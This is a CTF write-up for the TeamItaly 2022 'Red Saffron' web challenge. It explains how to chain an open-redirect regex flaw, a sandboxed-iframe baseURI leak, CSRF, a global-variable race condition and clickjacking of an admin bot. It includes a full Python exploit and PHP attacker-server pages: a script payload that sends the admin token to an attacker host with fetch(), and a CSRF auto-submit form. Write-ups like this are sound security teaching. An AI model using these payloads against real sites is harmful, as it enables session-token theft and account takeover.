# TeamItaly CTF 2022

## Red Saffron (1 solves)

Red Saffron is a website where users can store public and private recipes.

The target of the attack is the admin, emulated by a bot, and it's private recipe where the flag is stored.

It's possible to register two type of users in the webapp, authors and advertisers.

- An author can create new recipes (public or private) and will get paid if an advertiser buys an ad on its recipe.
- An advertiser can publish ads on the existing recipes and pay the author.

### Solution

Our ultimate goal is to leak the id of the recipe with the flag.
There is no authorization check to see a recipe, so we just need the id.

The flag recipe id is listed in `/private` when logged in as the admin.

We have two interesting inputs that can be useful to leak the flag:

- The content of a recipe, sanitized with DOMPurify
- The content of an ad, not sanitized but in a sandboxed iframe

#### Leak an admin token

The sandboxed iframe allows us to execute script.
Inside the sandboxed iframe it's possible to leak the url of the main document where the iframe is embedded with the `baseURI` variable.

In this way we can leak the url of the recipe where the ad is embedded.
This url is the url of the recipe where the ad is embedded and it's usuless by itself (you need to know it to buy the ad).

By abusing the authentication system, it's possible to use this leak to extract a valid token of the admin.

The authentication is separated from the main webapp and it works in this way:

- The webapp redirect to the authentication endpoint with the `redirect_uri` parameter (set to `http://saffron.challs.teamitaly.eu/cb`)
- The authentication endpoint asks the credentials of the user
- If the credentials are correct, the user get redirected to `redirect_uri` with the token added in the fragment of the url (e.g. `http://saffron.challs.teamitaly.eu/cb#token=1234&exp=1234`)
- The webapp get the token and saves it in a cookie, this token will be used by the webapp to get trusted information about the user from the authentication server

The value of `redirect_uri` is checked by the authentication system to match the regex `/^http:\/\/saffron.challs.teamitaly.eu\/cb/`.
This check is incomplete and allows to use the url of a recipe as `redirect_uri`, you just need a recipe with an id that starts with `cb`.

If we are able to make the bot login with `redirect_uri` equal to the url of a recipe that starts with `cb` (e.g.`http://saffron.challs.teamitaly.eu/cbefd7d0-0ec2-4053-bc22-4a501cb59e99`) after the login the bot will be redirect to `http://saffron.challs.teamitaly.eu/cbefd7d0-0ec2-4053-bc22-4a501cb59e99#token=1234&exp=1234`.
If we control the ad of the recipe we can leak the url and the admin token.

#### Redirect the bot

We can report a recipe to the admin and the bot will visit it.

The bot follows this logic:

- Load the recipe page
- Click on the login button
- Login
- Wait some time on the page

We can redirect the bot with a recipe that renders a link to our server above the login button.
This is allowed by DOMPurify and allows us to take control of the authorization flow.

#### Get the money to create an ad

To buy an ad you need 100$ that will be moved from the advertiser to the author.

All the registed users starts with a balance of 0$.

It's possible to exploit the infinite money of the admin by forcing it to buy an ad on a recipe controlled by us.
This can be done exploiting a csrf of the `/buyad` endpoint.

This exploit allows us to get money for a user of the `author` category.
But we need a user of the `advertiser` category to buy an ad.

To buy the ad using the money of the `author` user we can exploit a race condition in the `/buyad` endpoint.
Indeed `user_info` and `user_money` are not defined, so they become global variables in the server.

If we send two requests to buy an ad for different users at the same time it's possible to get the `user_info` of one user and the `user_money` of the other one.

By sending the requests for the author user with the money and the advertiser user without the money in a few tries it's possible to create the ad for the advertiser with the money of the author.

#### Get the flag

- Create a recipe with id that starts with `cb`
- Buy the ad of the recipe with a payload to leak the `baseURI`
- Redirect the bot login flow to set the `redirect_uri` to the recipe that starts with `cb`
- Leak the token and use it to get the flag

### Exploit

```python

import requests
import urllib.parse
import random
import string
import re
from threading import Thread


AUTH_HOST = 'http://uauth.challs.teamitaly.eu'
BLOG_HOST = 'http://saffron.challs.teamitaly.eu'
LEAK_URL = 'http://YOUR_SERVER/?leak='
ATTACK_URL = 'http://YOUR_SERVER/start.php'


def generate_random_string(n=10):
    return ''.join(random.choices(string.ascii_letters, k=n))

def generate_random_user(role):
    return {
        'username': generate_random_string(),
        'password': generate_random_string(),
        'role': role
    }

def register(user):
    r = requests.post(AUTH_HOST + '/register?redirect_uri=' + urllib.parse.quote(BLOG_HOST + '/registered'), data={
        'username': user['username'],
        'password': user['password'],
        'role': user['role']
    })
    assert(r.status_code == 200)

def login(user):
    r = requests.post(AUTH_HOST + '/auth?redirect_uri=' + urllib.parse.quote(BLOG_HOST + '/cb') + '&response_type=token', data={
        'username': user['username'],
        'password': user['password']
    })

    assert(r.status_code == 200)
    m = re.search(r'token=(.+)&exp', r.url)
    assert(m)
    user['token'] = m[1]
    return m[1]

def new_post(user, content):
    r = requests.post(BLOG_HOST + '/new', data={
        'title': generate_random_string(),
        'content': content
    },
        cookies={
        'token': user['token']
    })

    assert(r.status_code == 200)
    return r.url.split('/')[-1]

def get_user_balance(user):
    r = requests.get(BLOG_HOST + '/me', cookies={
        'token': user['token']
    })
    m = re.search(
        r'Username: (.+)\s+<br />\s+Role: (.+)\s+<br />\s+Balance: (\d+)', r.text)
    assert(m)
    return int(m[3])

def ad_is_free(user, recipeid, content):
    r = requests.post(BLOG_HOST + '/buyad', data={
        'ad': content,
        'recipeid': recipeid
    },
        cookies={
        'token': user['token']
    })

    if('ad already taken' in r.text):
        return False
    return True

def buy_ad_race_condition(user, recipeid, content):
    r = requests.post(BLOG_HOST + '/buyad', data={
        'ad': content,
        'recipeid': recipeid
    },
        cookies={
        'token': user['token']
    })

    if ('you need to be an advertiser to buy an ad' in r.text
            or 'not enough money' in r.text):
        print('.', end='')
        return

    if('ad already taken' in r.text
       or 'UNIQUE constraint failed' in r.text):
        print('V', end='')
        return

    print('?', end='')


author = generate_random_user('author')
register(author)
login(author)

advertiser = generate_random_user('advertiser')
register(advertiser)
login(advertiser)

post_payload = f'''
<a href="{ATTACK_URL}" style="background-color: red; width:300px; height:100px; position: absolute; right: 0px; top: 0px;"></a>
'''
recipeid_clickjacking_1 = new_post(author, post_payload)
recipeid_get_money = new_post(author, 'ciao')

print(author)
print(advertiser)

while(True):
    print(
        f'\n\nSet the csrf server to buy the ad of post: {recipeid_get_money}')
    print(
        f'Make the bot visit the post with recipeid: {recipeid_clickjacking_1}')

    input('\nEnter to continue...')

    balance = get_user_balance(author)

    print(f'\nBalance: {balance}\n')

    if(balance >= 100):
        break

    print('Retry')


while (True):
    recipeid_attack = new_post(author, 'ciao')
    if (recipeid_attack[:2] == 'cb'):
        break

payload_ad = f"<script>fetch('{LEAK_URL}' + encodeURIComponent(document.baseURI))</script>"

threads = []
for _ in range(20):
    t = Thread(target=buy_ad_race_condition,
               args=(author, recipeid_attack, payload_ad))
    threads.append(t)
    t.start()

    t = Thread(target=buy_ad_race_condition, args=(
        advertiser, recipeid_attack, payload_ad))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

post_payload = f'''
<a href="{AUTH_HOST}/auth?redirect_uri=http%3A%2F%2Flocalhost%3A3001%2F{recipeid_attack}&response_type=token" style="background-color: red; width:300px; height:100px; position: absolute; right: 0px; top: 0px;"></a>
'''
recipeid_clickjacking_2 = new_post(author, post_payload)

print('\n\nExploit post id is: ' + recipeid_attack)
print('Make the bot visit the post ' +
      recipeid_clickjacking_2 + ' to leak the token')

```

#### attacker server:

```php
// index.php

<?php
if(!empty($_GET['leak'])){
    echo "setting leak...";
    file_put_contents('./leak.txt',$_GET['leak']);
}
?>
<br />
<a href="/start.php">start exploit</a>
<br /><br />

Last leaked data:
<?php
$LEAK = file_get_contents('./leak.txt');
echo $LEAK;
 ?>
```

```php
// start.php

<?php
 $CSRFURL = "http://" . $_SERVER['HTTP_HOST'] . "/csrf.php";
 echo $CSRFURL;

 $AUTHURL = "http://uauth.challs.teamitaly.eu/auth?redirect_uri=http%3A%2F%2Flocalhost%3A3001%2Fcb&response_type=token";
 echo $AUTHURL;
?>

<script>
    window.open('<?php echo $CSRFURL;?>')
    document.location = '<?php echo $AUTHURL;?>'
</script>
```

```php
// csrf.php

<?php
 $RECIPEID = file_get_contents('./csrf_recipe_id.txt');
 $VICTIMURL = "http://saffron.challs.teamitaly.eu/buyad";
?>

<form action="<?php echo $VICTIMURL;?>" method="POST">
    <input name="recipeid" type="text" value="<?php echo $RECIPEID;?>" />
    <input name="ad" type="text" value="hello"/>
    <button type="submit" id="submit">Buy</button>
</form>

<script>
    setTimeout(() => {
        document.getElementById('submit').click()
    }, 4000);
</script>
```
